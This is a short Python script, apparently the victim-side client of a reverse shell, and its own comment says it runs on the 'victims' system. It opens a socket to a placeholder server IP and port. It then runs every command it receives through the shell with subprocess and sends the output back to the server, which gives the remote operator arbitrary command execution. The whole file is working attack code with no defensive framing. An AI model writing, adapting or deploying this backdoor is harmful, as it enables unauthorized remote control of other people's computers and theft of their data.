#this will be what's run on the "victims" system
import sys
import socket
import subprocess

#server IP addr
SERVER = "x.x.x.x"
PORT = xxx

#connecting to Server
s = socket.socket()
s.connect((SERVER, PORT))
msg = s.recv(1024).decode()
print('[*] server:', msg)

#Informing the server of typed cmd recieved
while True:
    cmd = s.recv(1024).decode()
    print(f'[+] received command: {cmd}')
    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
        break

    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        result = str(e).encode()

    if len(result) == 0:
        result = '[+] Executed'.encode()

    s.send(result)
